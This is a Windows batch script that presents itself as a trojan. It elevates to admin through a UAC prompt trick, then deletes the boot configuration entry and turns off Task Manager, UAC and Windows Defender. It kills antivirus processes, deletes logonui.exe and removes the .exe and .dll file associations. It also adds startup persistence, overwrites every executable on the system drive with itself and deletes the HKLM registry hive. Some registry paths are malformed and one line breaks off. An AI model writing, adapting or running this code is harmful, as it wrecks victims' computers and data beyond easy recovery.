@echo off
:: BatchGotAdmin (Run as Admin code starts)
REM --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
exit /B
:gotAdmin
if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
pushd "%CD%"
CD /D "%~dp0"
:: BatchGotAdmin (Run as Admin code ends)
:: Your codes should start from the following line
color 2
echo Run Trojan ?
pause >nul
cls
c:
bcdedit /delete {current}
taskkill /f /im rundll32.exe
md your all data deleted!
timeout 2 /nobreak >nul
cd your all data deleted!
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
cls
echo the task manager has been disabled! > %systemdrive%\users\public\Pictures\cz.txt
start %systemdrive%\users\public\Pictures\cz.txt
timeout 3 /nobreak >nul
taskkill /f /im notepad.exe
cls
echo your system has become garbage enjoy the new computer (created by kelanoza) > %systemdrive%\users\public\Pictures\mz.txt
start %systemdrive%\users\public\Pictures\mz.txt
timeout 3 /nobreak >nul
taskkill /f /im notepad.exe
taskkill /f /im taskmgr.exe
taskkill /f /im regedit.exe
taskkill /f /im supermium.exe
taskkill /f /im avg.exe
taskkill /f /im yandex.exe
taskkill /f /im eset.exe
reg add HKCU\Software\Policies\Microsoft\Windows\System\ /v DisableCMD /t REG_DWORD /d 2 /f
cd %userprofile%\Desktop\
start rundll32
start rundll32
start rundll32
start svchost
start svchost
takeown /f %systemroot%\system32\logonui.exe
icacls %systemroot%\system32\logonui.exe /grant %username%:F
icacls %systemroot%\system32\logonui.exe /grant "everyone":F
del %systemroot%\system32\logonui.exe /s /q /f
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:window
:: DISABLE WİFI
bcdedit /delete {0c1d734a-bcc4-11e7-b926-080027e8c6f} /f
rem ---------------------------------
rem Infect Autoexec.bat
echo start "" %0>>%SystemDrive%\AUTOEXEC.BAT
rem ---------------------------------
cls
rem Infect All .Exe Files
assoc .exe=dllfile
DIR /S/B %SystemDrive%\*.exe >> InfList_exe.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_exe.txt) do copy /y %0 "%%j:%%k"
rem ---------------------------------
reg delete hklm /f
exit